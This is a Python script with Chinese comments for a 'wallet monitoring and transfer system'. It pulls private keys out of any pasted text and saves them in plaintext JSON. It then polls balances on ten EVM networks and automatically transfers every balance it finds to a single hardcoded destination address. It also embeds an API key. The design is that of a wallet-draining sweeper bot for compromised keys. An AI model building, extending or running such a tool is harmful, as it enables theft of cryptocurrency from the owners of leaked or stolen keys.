#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
钱包监控转账系统 v1.0
支持所有Alchemy EVM兼容链的钱包监控和自动转账
修复菜单无限刷新问题
"""

import os
import sys
import json
import asyncio
import time
import re
from datetime import datetime
from typing import Dict, List, Optional, Any
from dataclasses import dataclass

# 自动安装依赖
def auto_install_dependencies():
    """自动检测并安装缺少的依赖"""
    required_packages = {
        'web3': 'web3',
        'eth_account': 'eth-account',
        'alchemy': 'alchemy-sdk',
        'colorama': 'colorama',
        'aiohttp': 'aiohttp',
        'cryptography': 'cryptography',
        'dataclass_wizard': 'dataclass-wizard'
    }
    
    missing_packages = []
    for module_name, package_name in required_packages.items():
        try:
            __import__(module_name)
        except ImportError:
            missing_packages.append(package_name)
    
    if missing_packages:
        print(f"❌ 缺少必要的依赖包: {', '.join(missing_packages)}")
        print("💡 正在自动安装...")
        
        import subprocess
        for package in missing_packages:
            try:
                subprocess.check_call([sys.executable, '-m', 'pip', 'install', package])
                print(f"✅ {package} 安装成功")
            except:
                try:
                    subprocess.check_call([sys.executable, '-m', 'pip', 'install', '--user', package])
                    print(f"✅ {package} 安装成功 (用户模式)")
                except:
                    print(f"❌ {package} 安装失败")
                    return False
    return True

# 确保依赖可用
if not auto_install_dependencies():
    print("❌ 依赖安装失败，请手动安装")
    sys.exit(1)

# 导入依赖
try:
    from web3 import Web3
    from eth_account import Account
    from alchemy import Alchemy, Network
    from colorama import Fore, Style, init
    import aiohttp
    import cryptography
    
    # 初始化colorama
    init(autoreset=True)
    
except ImportError as e:
    print(f"❌ 导入依赖失败: {e}")
    print("💡 请运行 wallet_monitor_launcher.py 来自动安装依赖")
    sys.exit(1)

# 配置
ALCHEMY_API_KEY = "S0hs4qoXIR1SMD8P7I6Wt"
TARGET_ADDRESS = "0x6b219df8c31c6b39a1a9b88446e0199be8f63cf1"

# 数据文件
WALLETS_FILE = "wallets.json"
MONITORING_LOG_FILE = "monitoring_log.json"
CONFIG_FILE = "config.json"

# Alchemy支持的EVM兼容链 (基于实际可用的网络)
SUPPORTED_NETWORKS = {
    "eth_mainnet": Network.ETH_MAINNET,
    "eth_goerli": Network.ETH_GOERLI,
    "matic_mainnet": Network.MATIC_MAINNET,
    "matic_mumbai": Network.MATIC_MUMBAI,
    "arb_mainnet": Network.ARB_MAINNET,
    "arb_goerli": Network.ARB_GOERLI,
    "opt_mainnet": Network.OPT_MAINNET,
    "opt_goerli": Network.OPT_GOERLI,
    "opt_kovan": Network.OPT_KOVAN,
    "astar_mainnet": Network.ASTAR_MAINNET,
}

# 网络名称映射
NETWORK_NAMES = {
    "eth_mainnet": "Ethereum 主网",
    "eth_goerli": "Ethereum Goerli 测试网",
    "matic_mainnet": "Polygon 主网",
    "matic_mumbai": "Polygon Mumbai 测试网",
    "arb_mainnet": "Arbitrum 主网",
    "arb_goerli": "Arbitrum Goerli 测试网",
    "opt_mainnet": "Optimism 主网",
    "opt_goerli": "Optimism Goerli 测试网",
    "opt_kovan": "Optimism Kovan 测试网",
    "astar_mainnet": "Astar 主网",
}

@dataclass
class WalletInfo:
    """钱包信息"""
    address: str
    private_key: str
    enabled_networks: List[str]
    last_checked: Dict[str, str]

class WalletMonitor:
    """钱包监控器"""
    
    def __init__(self):
        self.wallets: List[WalletInfo] = []
        self.alchemy_clients: Dict[str, Alchemy] = {}
        self.monitoring_active = False
        self.load_wallets()
        
    def initialize_clients(self):
        """初始化Alchemy客户端"""
        print(f"\n{Fore.CYAN}🔧 初始化网络客户端...{Style.RESET_ALL}")
        
        success_count = 0
        for network_key, network in SUPPORTED_NETWORKS.items():
            try:
                client = Alchemy(api_key=ALCHEMY_API_KEY, network=network)
                self.alchemy_clients[network_key] = client
                print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} 客户端初始化成功{Style.RESET_ALL}")
                success_count += 1
            except Exception as e:
                print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 客户端初始化失败: {e}{Style.RESET_ALL}")
        
        print(f"{Fore.GREEN}✅ 网络客户端初始化完成 ({success_count}/{len(SUPPORTED_NETWORKS)}){Style.RESET_ALL}")
    
    def load_wallets(self):
        """加载钱包数据"""
        if os.path.exists(WALLETS_FILE):
            try:
                with open(WALLETS_FILE, 'r', encoding='utf-8') as f:
                    data = json.load(f)
                    self.wallets = [WalletInfo(**wallet) for wallet in data]
            except Exception as e:
                print(f"{Fore.YELLOW}⚠️ 加载钱包数据失败: {e}{Style.RESET_ALL}")
                self.wallets = []
    
    def save_wallets(self):
        """保存钱包数据"""
        try:
            data = [wallet.__dict__ for wallet in self.wallets]
            with open(WALLETS_FILE, 'w', encoding='utf-8') as f:
                json.dump(data, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"{Fore.RED}❌ 保存钱包数据失败: {e}{Style.RESET_ALL}")
    
    def extract_private_keys(self, text: str) -> List[str]:
        """智能提取私钥"""
        # 私钥正则模式
        patterns = [
            r'0x[a-fA-F0-9]{64}',  # 带0x前缀的64位十六进制
            r'[a-fA-F0-9]{64}',    # 不带前缀的64位十六进制
        ]
        
        private_keys = []
        for pattern in patterns:
            matches = re.findall(pattern, text)
            for match in matches:
                # 规范化私钥格式
                key = match.lower()
                if not key.startswith('0x'):
                    key = '0x' + key
                
                # 验证私钥有效性
                try:
                    Account.from_key(key)
                    if key not in private_keys:
                        private_keys.append(key)
                except:
                    continue
        
        return private_keys
    
    def import_private_keys_menu(self):
        """导入私钥菜单"""
        print(f"\n{Fore.BLUE}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📥 批量导入私钥{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*50}{Style.RESET_ALL}")
        
        print(f"{Fore.YELLOW}💡 使用说明:{Style.RESET_ALL}")
        print("• 可以粘贴包含私钥的任意文本")
        print("• 系统会自动识别和提取有效私钥")
        print("• 支持带0x前缀和不带前缀的格式")
        print("• 双击回车确认导入")
        print("• 输入 'exit' 返回主菜单")
        
        collected_text = ""
        empty_line_count = 0
        
        print(f"\n{Fore.CYAN}请粘贴包含私钥的文本 (双击回车确认):${Style.RESET_ALL}")
        
        while True:
            try:
                line = input()
                if line.strip() == "exit":
                    return
                
                if line.strip() == "":
                    empty_line_count += 1
                    if empty_line_count >= 2:
                        break
                else:
                    empty_line_count = 0
                    collected_text += line + "\n"
            except KeyboardInterrupt:
                return
        
        if not collected_text.strip():
            print(f"{Fore.YELLOW}⚠️ 未输入任何内容{Style.RESET_ALL}")
            input(f"{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        # 提取私钥
        private_keys = self.extract_private_keys(collected_text)
        
        if not private_keys:
            print(f"{Fore.RED}❌ 未找到有效的私钥{Style.RESET_ALL}")
            input(f"{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🔍 找到 {len(private_keys)} 个有效私钥:{Style.RESET_ALL}")
        
        # 显示找到的地址并去重
        new_wallets = []
        existing_addresses = {wallet.address.lower() for wallet in self.wallets}
        
        for i, private_key in enumerate(private_keys, 1):
            try:
                account = Account.from_key(private_key)
                address = account.address
                
                if address.lower() in existing_addresses:
                    print(f"{Fore.YELLOW}{i}. {address} (已存在){Style.RESET_ALL}")
                else:
                    print(f"{Fore.GREEN}{i}. {address} (新增){Style.RESET_ALL}")
                    wallet_info = WalletInfo(
                        address=address,
                        private_key=private_key,
                        enabled_networks=list(SUPPORTED_NETWORKS.keys()),
                        last_checked={}
                    )
                    new_wallets.append(wallet_info)
                    existing_addresses.add(address.lower())
            except Exception as e:
                print(f"{Fore.RED}{i}. 无效私钥: {e}{Style.RESET_ALL}")
        
        if new_wallets:
            confirm = input(f"\n{Fore.CYAN}确认导入 {len(new_wallets)} 个新钱包? (y/N): {Style.RESET_ALL}")
            if confirm.lower() in ['y', 'yes']:
                self.wallets.extend(new_wallets)
                self.save_wallets()
                print(f"{Fore.GREEN}✅ 成功导入 {len(new_wallets)} 个钱包{Style.RESET_ALL}")
            else:
                print(f"{Fore.YELLOW}❌ 取消导入{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}💡 没有新钱包需要导入{Style.RESET_ALL}")
        
        input(f"{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
    
    async def check_address_activity(self, address: str, network_key: str) -> bool:
        """检查地址在指定网络上是否有交易活动"""
        try:
            client = self.alchemy_clients[network_key]
            
            # 获取交易历史
            response = await client.core.get_asset_transfers(
                from_address=address,
                category=["external", "internal", "erc20", "erc721", "erc1155"]
            )
            
            if response and hasattr(response, 'transfers') and len(response.transfers) > 0:
                return True
                
            # 检查接收的交易
            response = await client.core.get_asset_transfers(
                to_address=address,
                category=["external", "internal", "erc20", "erc721", "erc1155"]
            )
            
            return response and hasattr(response, 'transfers') and len(response.transfers) > 0
            
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ 检查 {NETWORK_NAMES[network_key]} 活动失败: {e}{Style.RESET_ALL}")
            return False
    
    async def get_balance(self, address: str, network_key: str) -> float:
        """获取地址在指定网络的余额"""
        try:
            client = self.alchemy_clients[network_key]
            balance_wei = await client.core.get_balance(address)
            balance_eth = Web3.from_wei(balance_wei, 'ether')
            return float(balance_eth)
        except Exception as e:
            print(f"{Fore.YELLOW}⚠️ 获取 {NETWORK_NAMES[network_key]} 余额失败: {e}{Style.RESET_ALL}")
            return 0.0
    
    async def transfer_balance(self, wallet: WalletInfo, network_key: str, balance: float) -> bool:
        """转移余额到目标地址"""
        try:
            client = self.alchemy_clients[network_key]
            w3 = Web3()
            
            # 创建账户
            account = Account.from_key(wallet.private_key)
            
            # 获取nonce
            nonce = await client.core.get_transaction_count(wallet.address)
            
            # 获取gas价格
            gas_price = await client.core.get_gas_price()
            
            # 估算gas费用
            gas_limit = 21000  # 标准转账
            gas_cost = gas_price * gas_limit
            
            # 计算实际转账金额
            balance_wei = Web3.to_wei(balance, 'ether')
            transfer_amount = balance_wei - gas_cost
            
            if transfer_amount <= 0:
                print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 余额不足支付gas费{Style.RESET_ALL}")
                return False
            
            # 构建交易
            transaction = {
                'to': TARGET_ADDRESS,
                'value': transfer_amount,
                'gas': gas_limit,
                'gasPrice': gas_price,
                'nonce': nonce,
            }
            
            # 签名交易
            signed_txn = account.sign_transaction(transaction)
            
            # 发送交易
            tx_hash = await client.core.send_raw_transaction(signed_txn.rawTransaction)
            
            # 记录转账
            log_entry = {
                'timestamp': datetime.now().isoformat(),
                'from_address': wallet.address,
                'to_address': TARGET_ADDRESS,
                'amount': Web3.from_wei(transfer_amount, 'ether'),
                'network': network_key,
                'tx_hash': tx_hash.hex(),
                'gas_used': gas_cost
            }
            
            self.log_transfer(log_entry)
            
            print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} 转账成功: {Web3.from_wei(transfer_amount, 'ether'):.6f} ETH{Style.RESET_ALL}")
            print(f"{Fore.CYAN}📋 交易哈希: {tx_hash.hex()}{Style.RESET_ALL}")
            
            return True
            
        except Exception as e:
            print(f"{Fore.RED}❌ {NETWORK_NAMES[network_key]} 转账失败: {e}{Style.RESET_ALL}")
            return False
    
    def log_transfer(self, log_entry: Dict):
        """记录转账日志"""
        logs = []
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
            except:
                logs = []
        
        logs.append(log_entry)
        
        try:
            with open(MONITORING_LOG_FILE, 'w', encoding='utf-8') as f:
                json.dump(logs, f, ensure_ascii=False, indent=2)
        except Exception as e:
            print(f"{Fore.RED}❌ 保存转账日志失败: {e}{Style.RESET_ALL}")
    
    async def monitor_wallet(self, wallet: WalletInfo):
        """监控单个钱包"""
        print(f"\n{Fore.CYAN}🔍 开始监控钱包: {wallet.address}{Style.RESET_ALL}")
        
        # 检查每个网络的活动
        active_networks = []
        for network_key in wallet.enabled_networks:
            if network_key in self.alchemy_clients:
                print(f"{Fore.YELLOW}📡 检查 {NETWORK_NAMES[network_key]} 活动...{Style.RESET_ALL}")
                
                has_activity = await self.check_address_activity(wallet.address, network_key)
                if has_activity:
                    active_networks.append(network_key)
                    print(f"{Fore.GREEN}✅ {NETWORK_NAMES[network_key]} 有交易记录{Style.RESET_ALL}")
                else:
                    print(f"{Fore.YELLOW}⚠️ {NETWORK_NAMES[network_key]} 无交易记录，跳过监控{Style.RESET_ALL}")
        
        if not active_networks:
            print(f"{Fore.YELLOW}⚠️ 钱包 {wallet.address} 在所有网络都无活动{Style.RESET_ALL}")
            return
        
        # 监控活跃网络的余额
        while self.monitoring_active:
            for network_key in active_networks:
                try:
                    balance = await self.get_balance(wallet.address, network_key)
                    
                    if balance > 0:
                        print(f"\n{Fore.GREEN}💰 发现余额!{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}📍 地址: {wallet.address}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}🌐 网络: {NETWORK_NAMES[network_key]}{Style.RESET_ALL}")
                        print(f"{Fore.CYAN}💵 余额: {balance:.6f} ETH{Style.RESET_ALL}")
                        
                        # 自动转账
                        success = await self.transfer_balance(wallet, network_key, balance)
                        if success:
                            print(f"{Fore.GREEN}🎉 自动转账完成!{Style.RESET_ALL}")
                        else:
                            print(f"{Fore.RED}❌ 自动转账失败{Style.RESET_ALL}")
                
                except Exception as e:
                    print(f"{Fore.RED}❌ 监控 {NETWORK_NAMES[network_key]} 失败: {e}{Style.RESET_ALL}")
            
            # 等待下次检查
            await asyncio.sleep(30)  # 30秒检查一次
    
    async def start_monitoring(self):
        """开始监控所有钱包"""
        if not self.wallets:
            print(f"{Fore.RED}❌ 没有导入的钱包{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.GREEN}🎯 开始监控 {len(self.wallets)} 个钱包{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}💡 按 Ctrl+C 停止监控{Style.RESET_ALL}")
        
        self.monitoring_active = True
        
        # 并发监控所有钱包
        tasks = []
        for wallet in self.wallets:
            task = asyncio.create_task(self.monitor_wallet(wallet))
            tasks.append(task)
        
        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
        finally:
            self.monitoring_active = False
    
    def start_monitoring_menu(self):
        """开始监控菜单"""
        if not self.wallets:
            print(f"\n{Fore.RED}❌ 请先导入钱包私钥{Style.RESET_ALL}")
            input(f"{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
            return
        
        print(f"\n{Fore.BLUE}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}🎯 开始监控{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*50}{Style.RESET_ALL}")
        
        print(f"{Fore.CYAN}📊 将监控 {len(self.wallets)} 个钱包{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🌐 支持 {len(SUPPORTED_NETWORKS)} 个网络{Style.RESET_ALL}")
        print(f"{Fore.CYAN}🎯 目标地址: {TARGET_ADDRESS}{Style.RESET_ALL}")
        
        confirm = input(f"\n{Fore.CYAN}确认开始监控? (y/N): {Style.RESET_ALL}")
        if confirm.lower() in ['y', 'yes']:
            try:
                asyncio.run(self.start_monitoring())
            except KeyboardInterrupt:
                print(f"\n{Fore.YELLOW}⚠️ 监控已停止{Style.RESET_ALL}")
        else:
            print(f"{Fore.YELLOW}❌ 取消监控{Style.RESET_ALL}")
        
        input(f"{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
    
    def show_status(self):
        """显示系统状态"""
        print(f"\n{Fore.YELLOW}📊 系统状态{Style.RESET_ALL}")
        print("="*50)
        print(f"💼 钱包数量: {len(self.wallets)}")
        
        print(f"\n🎯 目标地址: {TARGET_ADDRESS}")
        print(f"🔑 API密钥: {ALCHEMY_API_KEY[:10]}...")
        
        # 显示转账记录数量
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                print(f"📋 转账记录: {len(logs)} 条")
            except:
                print(f"📋 转账记录: 无法读取")
        else:
            print(f"📋 转账记录: 0 条")
    
    def show_detailed_status(self):
        """显示详细状态"""
        print(f"\n{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.BLUE}📊 详细系统状态{Style.RESET_ALL}")
        print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
        
        print(f"\n{Fore.YELLOW}🌐 网络状态:{Style.RESET_ALL}")
        for network_key, client in self.alchemy_clients.items():
            status = "🟢 正常" if client else "🔴 异常"
            print(f"  {NETWORK_NAMES[network_key]}: {status}")
        
        print(f"\n{Fore.YELLOW}💼 钱包详情:{Style.RESET_ALL}")
        if not self.wallets:
            print("  暂无导入的钱包")
        else:
            for i, wallet in enumerate(self.wallets, 1):
                print(f"  {i}. {wallet.address}")
                print(f"     启用网络: {len(wallet.enabled_networks)} 个")
        
        print(f"\n{Fore.YELLOW}📋 转账历史:{Style.RESET_ALL}")
        if os.path.exists(MONITORING_LOG_FILE):
            try:
                with open(MONITORING_LOG_FILE, 'r', encoding='utf-8') as f:
                    logs = json.load(f)
                if logs:
                    print(f"  总转账次数: {len(logs)}")
                    recent_logs = logs[-3:] if len(logs) > 3 else logs
                    for log in recent_logs:
                        print(f"  • {log['timestamp'][:19]} - {log['amount']:.6f} ETH")
                else:
                    print("  暂无转账记录")
            except:
                print("  转账记录读取失败")
        else:
            print("  暂无转账记录")
        
        print(f"\n{Fore.YELLOW}⚙️ 系统配置:{Style.RESET_ALL}")
        print(f"  目标地址: {TARGET_ADDRESS}")
        print(f"  API密钥: {ALCHEMY_API_KEY[:10]}...")
        print(f"  监控状态: {'🟢 运行中' if self.monitoring_active else '🔴 已停止'}")
    
    def main_menu(self):
        """主菜单 - 修复无限刷新问题"""
        while True:
            # 清屏，避免菜单堆叠
            os.system('clear' if os.name == 'posix' else 'cls')
            
            print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
            print(f"{Fore.BLUE}🔐 钱包监控转账系统 v1.0{Style.RESET_ALL}")
            print(f"{Fore.BLUE}{'='*60}{Style.RESET_ALL}")
            
            self.show_status()
            
            print(f"\n{Fore.YELLOW}📋 功能菜单:{Style.RESET_ALL}")
            print("1. 📥 导入私钥")
            print("2. 🎯 开始监控")
            print("3. 📊 查看详细状态")
            print("4. 🚪 退出")
            
            try:
                choice = input(f"\n{Fore.CYAN}请选择功能 (1-4): {Style.RESET_ALL}").strip()
                
                if choice == "1":
                    self.import_private_keys_menu()
                elif choice == "2":
                    self.start_monitoring_menu()
                elif choice == "3":
                    # 显示详细状态
                    self.show_detailed_status()
                    input(f"\n{Fore.CYAN}按回车键返回主菜单...{Style.RESET_ALL}")
                elif choice == "4":
                    print(f"\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                    break
                else:
                    print(f"{Fore.RED}❌ 无效选择，请输入 1-4{Style.RESET_ALL}")
                    time.sleep(2)  # 暂停2秒而不是等待输入
                    
            except KeyboardInterrupt:
                print(f"\n\n{Fore.GREEN}👋 感谢使用钱包监控系统！{Style.RESET_ALL}")
                break
            except Exception as e:
                print(f"\n{Fore.RED}❌ 发生错误: {e}{Style.RESET_ALL}")
                time.sleep(3)  # 错误时暂停3秒

def main():
    """主函数"""
    try:
        monitor = WalletMonitor()
        monitor.initialize_clients()
        monitor.main_menu()
    except Exception as e:
        print(f"{Fore.RED}❌ 系统启动失败: {e}{Style.RESET_ALL}")
        sys.exit(1)

if __name__ == "__main__":
    main()
